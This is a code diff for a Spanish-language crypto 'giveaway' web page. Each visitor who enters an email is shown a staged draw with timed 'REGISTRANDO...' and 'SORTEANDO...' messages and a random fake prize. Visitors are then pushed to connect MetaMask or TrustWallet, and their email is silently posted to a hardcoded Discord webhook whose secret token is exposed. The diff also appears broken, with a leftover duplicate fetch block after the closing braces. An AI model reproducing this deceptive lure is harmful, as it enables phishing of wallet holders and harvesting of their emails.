@@ -33,7 +33,7 @@ document.getElementById('conectarMetaMask').addEventListener('click', () => {
 
 document.getElementById('enviar').addEventListener('click', function() {
     const email = document.getElementById('email').value;
-
+    
     // Validar el formato del correo electrónico
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (!emailRegex.test(email)) {
@@ -42,29 +42,57 @@ document.getElementById('enviar').addEventListener('click', function() {
         emailAlert.style.display = 'block';
         return;
     }
+
+    // Cambio de texto a "Registrando..." para iniciar el proceso
     const botonEnviar = document.getElementById('enviar');
-    botonEnviar.textContent = "REGISTRADO";
+    botonEnviar.textContent = "REGISTRANDO...";
 
-    const cryptoOptions = ['BTC', 'TRX', 'BNB', 'ETH', 'SHIB', 'DOGE', 'MATIC', 'USDT', 'BUSD'];
-    const randomCrypto = cryptoOptions[Math.floor(Math.random() * cryptoOptions.length)];
-    const randomValue = [5, 7, 12, 15, 18, 23][Math.floor(Math.random() * 6)];
+    setTimeout(() => {
+        // Cambio de texto a "Sorteando..." para simular el proceso de sorteo
+        botonEnviar.textContent = "SORTEANDO...";
+        
+        setTimeout(() => {
+            // Selección aleatoria de criptomoneda y cantidad tras "sortear"
+            const cryptoOptions = ['BTC', 'TRX', 'BNB', 'ETH', 'SHIB', 'DOGE', 'MATIC', 'USDT', 'BUSD'];
+            const randomCrypto = cryptoOptions[Math.floor(Math.random() * cryptoOptions.length)];
+            const randomValue = [5, 7, 12, 15, 18, 23][Math.floor(Math.random() * 6)];
 
-    const prizeAlert = document.getElementById('prizeAlert');
-    prizeAlert.textContent = `¡Felicidades! Has ganado ${randomValue} USD en ${randomCrypto.toUpperCase()} 🎉 Conecta con Metamask Para cobrar tu premio!`;
-    prizeAlert.style.display = 'block';
+            // Muestra el resultado del sorteo
+            const prizeAlert = document.getElementById('prizeAlert');
+            prizeAlert.textContent = `¡Felicidades! Has ganado ${randomValue} USD en ${randomCrypto.toUpperCase()} 🎉 Conecta con MetaMask o TrustWallet para cobrar tu premio!`;
+            prizeAlert.style.display = 'block';
+            botonEnviar.textContent = "REGISTRADO";
 
-    // Enviar datos al webhook de Discord
-    const webhookUrl = 'https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-'; // Reemplazar con el URL de tu webhook de Discord
-    const data = {
-        content: `¡Felicidades! Has ganado ${randomValue} USD en ${randomCrypto.toUpperCase()} 🎉`,
-        embeds: [
-            {
-                title: 'Correo Electrónico Ganador',
-                description: email,
-                color: 16776960
-            }
-        ]
-    };
+            // Enviar datos al webhook de Discord
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-'; // Reemplazar con el URL de tu webhook de Discord
+            const data = {
+                content: `¡Felicidades! Has ganado ${randomValue} USD en ${randomCrypto.toUpperCase()} 🎉`,
+                embeds: [
+                    {
+                        title: 'Correo Electrónico Ganador',
+                        description: email,
+                        color: 16776960
+                    }
+                ]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(responseData => {
+                // Manejar la respuesta del servidor de Discord si es necesario
+                console.log(responseData);
+            });
+
+        }, 3000); // Demora de 3 segundos para simular el sorteo
+    }, 1000); // Demora inicial de 1 segundo
+});
+
 
     fetch(webhookUrl, {
         method: 'POST',
